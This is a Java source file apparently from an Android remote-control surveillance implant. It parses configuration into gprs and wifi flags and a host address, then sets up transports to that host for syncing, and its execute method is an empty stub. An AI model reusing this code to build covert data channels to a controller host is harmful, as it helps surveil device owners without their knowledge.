package com.ht.RCSAndroidGUI.action;

import java.io.IOException;
import java.util.Vector;

import com.ht.RCSAndroidGUI.action.sync.DirectTransport;
import com.ht.RCSAndroidGUI.action.sync.Protocol;
import com.ht.RCSAndroidGUI.action.sync.WifiTransport;
import com.ht.RCSAndroidGUI.utils.DataReadBuffer;
import com.ht.RCSAndroidGUI.utils.WChar;

public class SyncActionInternet extends SyncAction {

	protected boolean wifiForced;

	protected boolean wifi;
	protected boolean gprs;
	String host;

	public SyncActionInternet(int type, byte[] confParams) {
		super(type, confParams);
	}

	@Override
	public boolean execute() {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	protected boolean parse(byte[] confParams) {
		final DataReadBuffer databuffer = new DataReadBuffer(confParams, 0,
				confParams.length);

		try {
			gprs = databuffer.readInt() == 1;
			wifi = databuffer.readInt() == 1;

			final int len = databuffer.readInt();
			final byte[] buffer = new byte[len];
			databuffer.readFully(buffer);

			host = WChar.getString(buffer, true);

		} catch (final IOException e) {
			// #ifdef DEBUG
			debug.error("params FAILED");
			// #endif
			return false;
		}

		// #ifdef DEBUG
		final StringBuffer sb = new StringBuffer();
		sb.append("gprs: " + gprs);
		sb.append(" wifi: " + wifi);
		sb.append(" wifiForced: " + wifiForced);
		sb.append(" host: " + host);
		debug.trace(sb.toString());
		// #endif

		return true;
	}

	@Override
	protected boolean initTransport() {
		if (wifi) {
			// #ifdef DEBUG
			debug.trace("initTransport adding WifiTransport");
			// #endif
			transports.addElement(new WifiTransport(host, wifiForced));
		}

		if (gprs) {
			// #ifdef DEBUG
			debug.trace("initTransport adding DirectTransport");
			// #endif
			transports.addElement(new DirectTransport(host));
		}

		return true;
	}

}
